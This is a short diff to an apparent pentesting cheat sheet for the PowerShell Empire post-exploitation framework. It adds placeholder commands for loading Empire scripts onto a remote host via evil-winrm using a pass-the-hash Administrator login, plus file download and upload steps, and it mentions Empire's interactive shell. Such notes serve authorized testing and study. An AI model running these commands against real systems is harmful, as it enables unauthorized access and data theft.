@@ -80,6 +80,16 @@
 
 #### Configuration: set agent AGENT_NAME, execute
 
+## INCLUDE EMPIRE SCRIPTS ON A REMOTE MACHINE
+
+### Scripts location: /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
+
+#### evil-winrm -u Administrator -H HASH -i IP -s EMPIRE_DIR
+
+#### download REMOTE_PATH LOCAL_PATH
+
+#### upload LOCAL_PATH REMOTE_PATH
+
 ## INTERACTIVE SHELL
 
 ### The interactive shell was a new feature in Empire 4.0. It effectively allows you to access a traditional pseudo-command shell from within Starkiller or the Empire CLI Client. This can be used to execute PowerShell commands, as you would in a Powershell reverse shell.
